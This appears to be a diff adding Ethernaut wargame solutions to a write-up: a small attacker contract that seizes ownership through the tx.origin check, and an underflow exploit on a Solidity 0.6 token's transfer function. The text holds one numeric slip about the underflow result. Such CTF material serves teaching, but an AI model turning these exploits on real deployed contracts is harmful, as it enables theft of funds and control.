@@ -148,7 +148,7 @@ interface ICoinFlip {
 }
 contract Attacker {
 
-    ICoinFlip public iCoinFlip;
+    ICoinFlip public immutable iCoinFlip;
 
     uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
     
@@ -169,3 +169,74 @@ contract Attacker {
 
 Then, we can call `attack()` 10 times (making sure we call it in a different block from the one in the previous transaction) and we'll flip the coin correctly 10 straigth times! We could also automate this using ethers.js and looping for 10 times, interacting with the contract every time a block is added to the blockchain to surpass the contract's block check.
 Fourth Ethernaut level completed ✅
+
+## 5. Telephone 📞
+> Claim ownership of the contract below to complete this level.
+> Things that might help
+> - See the Help page above, section "Beyond the console"
+
+In order to complete this level, we need to claim ownership of the contract. We can do this by calling the 'changeOwner()' method:
+
+```solidity
+function changeOwner(address _owner) public {
+    if (tx.origin != msg.sender) {
+      owner = _owner;
+    }
+  }
+```
+As we can see, in order to become the owner, `tx.origin` must be different from `msg.sender`. What is the difference between them? As [this O'Reilly post describes](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml), the `tx.origin` global variable refers to the original external account that started the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) that invokes the function. 
+
+Knowing this, we reach the conclusion that in order to change the contract ownership, we need to call the 'changeOwner()' from a contract. We can create a simple contract to do so:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.4;
+interface ITelephone {
+    function changeOwner(address _owner) external;
+}
+contract Attacker {
+    ITelephone public immutable iTelephone;
+
+    constructor(address _telephone) {
+        iTelephone = ITelephone(_telephone);
+    }
+
+    function attack() external {
+        iTelephone.changeOwner(msg.sender);
+    }
+}
+```
+This way, tx.origin will be our EOA account, while msg.sender will be our newly crafted contract's account.
+
+Fifth Ethernaut level completed ✅
+## 6. Token 💎
+> The goal of this level is for you to hack the basic token contract below.
+>
+> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
+>
+> Things that might help:
+>
+> - What is an odometer?
+
+This level consists of a token contract we need to hack. We start with 20 tokens, and we'll pass the level if we are able to obtain more tokens. 
+
+Checking the contract, the only way to obtain more tokens is via the `transfer()` function:
+```solidity
+function transfer(address _to, uint _value) public returns (bool) {
+    require(balances[msg.sender] - _value >= 0);
+    balances[msg.sender] -= _value;
+    balances[_to] += _value;
+    return true;
+  }
+```
+
+The contract tracks how many tokens each user has using the `balances` mapping. The `transfer()` function decreases the value to transfer from `msg.sender` balance, and adds it to the receiver address.
+
+The "What is an odometer" level hint makes us think of the solidity underflow vulnerability. An underflow is a situation when uint (unsigned integer) reaches its minimum byte size. Imagine we have a 1 byte (8 bits) variable. When it's set to 0, its value will be 0 (00000000 in bits). If we try to decrease just 1 from there, next value won't be -1, but 255 (11111111 in bits), because it underflows just like an odometer would do. 
+
+In Solidity versions equal or higher to 0.8, this issue is handled by Solidity itself by reverting when an underflow or overflow occurs. In this particular level, Solidity version  is ^0.6.0, so Solidity won't revert on underflow and we can try to make our inicial 20 token balance (0000..00010100) become the maximum available value in 256 bits (1111....11111111) by substracting 21 tokens from our balance by using `transfer()` function, and cause an underflow. Because `balances[msg.sender] - _value` will become 256, we can surpass the first check in the function, and end up having the maximum possible token balance. So we end up doing a simple transfer to a random address:
+
+```javascript
+await contract.transfer("0x0000000000000000000000000000000000000000", 21);
+```
+
+Sixth Ethernaut level completed ✅
